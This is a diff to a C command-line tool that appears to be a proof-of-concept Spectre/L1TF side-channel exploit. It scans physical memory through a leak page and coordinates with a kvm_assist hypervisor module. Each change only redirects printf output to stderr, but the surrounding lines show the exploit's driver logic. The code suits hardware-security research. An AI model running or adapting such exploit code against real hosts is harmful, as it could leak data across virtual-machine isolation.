@@ -133,7 +133,7 @@ size_t find_min(void *buf) {
   struct time_deque t;
   time_deque_init(&t);
 
-  printf("Attempting to scan the first %lu bytes of the physical "
+  fprintf(stderr, "Attempting to scan the first %lu bytes of the physical "
          "address space for a half-Spectre hit.\n",
          (uint64_t)MAX_IDX * 8);
 
@@ -161,7 +161,7 @@ size_t find_min(void *buf) {
           if (time < 180) {
             time = access_buffer_with_spectre(buf, idx, 10000);
             if (time < CACHE_HIT_THRESHOLD) {
-              printf("\nHIT!\nidx: %lx\ntime: %ld\n", idx, time);
+              fprintf(stderr, "\nHIT!\nidx: %lx\ntime: %ld\n", idx, time);
             }
           }
         }
@@ -192,7 +192,7 @@ void cmd_determine(void *leak_page) {
     evicted = x < evicted ? x : evicted;
   }
 
-  printf("Cached: %ld\tEvicted: %ld\n", cached, evicted);
+  fprintf(stderr, "Cached: %ld\tEvicted: %ld\n", cached, evicted);
   access_buffer_with_spectre(leak_page, 1, 1);
 }
 
@@ -214,10 +214,10 @@ void cmd_calc(int argc, char *argv[argc]) {
     err(EXIT_FAILURE, "Could not parse physical address of hit page");
   }
 
-  printf("Leaked index 0x%lx is at 0x%lx\n", min, phys_addr);
+  fprintf(stderr, "Leaked index 0x%lx is at 0x%lx\n", min, phys_addr);
 
   uintptr_t phys_addr_of_array_start = phys_addr - (min * 8);
-  printf("Therefore, index 0x0 is at 0x%lx\n", phys_addr_of_array_start);
+  fprintf(stderr, "Therefore, index 0x0 is at 0x%lx\n", phys_addr_of_array_start);
 
   if (argc >= 3) {
     uintptr_t requested_phys_addr = strtoull(argv[2], &endptr, 16);
@@ -231,7 +231,7 @@ void cmd_calc(int argc, char *argv[argc]) {
     }
 
     size_t requested_index = (requested_phys_addr - phys_addr_of_array_start) / 8;
-    printf("Requested physical address is at index 0x%lx\n", requested_index);
+    fprintf(stderr, "Requested physical address is at index 0x%lx\n", requested_index);
   }
 }
 
@@ -251,11 +251,11 @@ void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
     err(EXIT_FAILURE, "Could not parse iterations");
   }
 
-  printf("Doing %ld iterations\n", iterations);
+  fprintf(stderr, "Doing %ld iterations\n", iterations);
   size_t hit = access_buffer_with_spectre(leak_page, min, iterations);
   size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations);
 
-  printf("Mins\n\tMiss: %ld\tHit: %ld\tHit?: %s\n", miss, hit, hit < CACHE_HIT_THRESHOLD ? "YES!" : "no");
+  fprintf(stderr, "Mins\n\tMiss: %ld\tHit: %ld\tHit?: %s\n", miss, hit, hit < CACHE_HIT_THRESHOLD ? "YES!" : "no");
 }
 
 void cmd_access_min(int argc, char *argv[argc], void *leak_page) {
@@ -282,7 +282,7 @@ void cmd_access_min(int argc, char *argv[argc], void *leak_page) {
     }
   }
 
-  printf("Accessing 0x%lx... (%ld cache lines)\n", min, length);
+  fprintf(stderr, "Accessing 0x%lx... (%ld cache lines)\n", min, length);
   int triggers = 0;
   uint64_t start = clock_read();
   while (1) {
@@ -292,7 +292,7 @@ void cmd_access_min(int argc, char *argv[argc], void *leak_page) {
     }
     if (triggers % 1000000 == 0) {
       double duration = (clock_read() - start) / 1000000000.0;
-      printf("\rtrigger: %d,   triggers / sec: %.1f K", triggers, 0.001*triggers/duration);
+      fprintf(stderr, "\rtrigger: %d,   triggers / sec: %.1f K", triggers, 0.001*triggers/duration);
       fflush(stdout);
     }
   }
@@ -309,7 +309,7 @@ void cmd_inform_kvm_assist(int argc, char *argv[argc]) {
   if (endptr == argv[0]) {
     err(EXIT_FAILURE, "Could not parse value");
   }
-  printf("Read value 0x%lx\n", value);
+  fprintf(stderr, "Read value 0x%lx\n", value);
 
   const char *path = "/proc/kvm_assist/search_for_page";
   int fd = open(path, O_WRONLY);
@@ -321,7 +321,7 @@ void cmd_inform_kvm_assist(int argc, char *argv[argc]) {
     err(EXIT_FAILURE, "Failed to write to %s", path);
   }
   close(fd);
-  printf("Succesfully informed kvm_assist module of the value of the leak page\n");
+  fprintf(stderr, "Succesfully informed kvm_assist module of the value of the leak page\n");
 }
 
 void pin_cpu(void) {
@@ -381,11 +381,11 @@ int main(int argc, char *argv[argc]) {
   pin_cpu();
 
   void *leak_page = l1tf_spawn_leak_page();
-  printf("Spawned leak page: ");
+  fprintf(stderr, "Spawned leak page: ");
   for (size_t i = 0; i < sizeof(uint64_t); ++i) {
-    printf("%02x ", ((unsigned char *)leak_page)[i]);
+    fprintf(stderr, "%02x ", ((unsigned char *)leak_page)[i]);
   }
-  printf("(0x%lx)\n", (*(uint64_t *)leak_page));
+  fprintf(stderr, "(0x%lx)\n", (*(uint64_t *)leak_page));
 
   // Use this to get physical address of the leak page with the
   // kvm_assist.ko module in the hypervisor
@@ -401,10 +401,10 @@ int main(int argc, char *argv[argc]) {
     cmd_access_min(argc, argv, leak_page);
   } else if (!strcmp(argv[1], "find_min")) {
     size_t min = find_min(leak_page);
-    printf("Min: %ld (or 0x%lx)\n", min, min);
+    fprintf(stderr, "Min: %ld (or 0x%lx)\n", min, min);
   } else if (!strcmp(argv[1], "find_base")) {
     void *base = find_base(leak_page);
-    printf("Base of array: %p\n", base);
+    fprintf(stderr, "Base of array: %p\n", base);
   } else if (!strcmp(argv[1], "apic")) {
     const long msr = 0x1B;
     long nr_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);
@@ -413,7 +413,7 @@ int main(int argc, char *argv[argc]) {
     }
     for (size_t cpu = 0; cpu < (size_t)nr_of_cpus; ++cpu) {
       uint64_t value = read_msr(cpu, msr) & 0xfffff000;
-      printf("CPU %ld: %lx\n", cpu, value);
+      fprintf(stderr, "CPU %ld: %lx\n", cpu, value);
     }
   } else if (!strcmp(argv[1], "l1tf")) {
     return l1tf_main(argc - 1, &argv[1]);
